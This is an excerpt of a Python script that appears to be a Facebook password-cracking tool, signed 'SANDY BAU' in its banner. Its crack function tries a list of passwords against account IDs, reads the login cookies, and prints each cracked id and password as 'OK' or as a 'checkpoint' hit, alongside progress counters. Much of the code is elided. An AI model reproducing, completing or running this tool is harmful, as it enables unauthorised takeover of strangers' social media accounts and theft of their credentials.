...
def back():
	login()
def contact():
	os.system('xdg-open https://www.facebook.com/profile.php?id=61550923678292')
	back()
def linex():
	print('\033[1;37m----------------------------------------------')
...
╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░
\033[1;37m----------------------------------------------
 WRITTEN BY : S A N D Y B A U 
 GITHUB     : N O T F O U N D
\033[1;37m----------------------------------------------""")
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[SANDY GOD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [SANDY-CP] {idf} │ {pw} {P}')
				...
				print(f'\r{P}{H} [SANDY-OK] {idf} │ {pw} {P}')
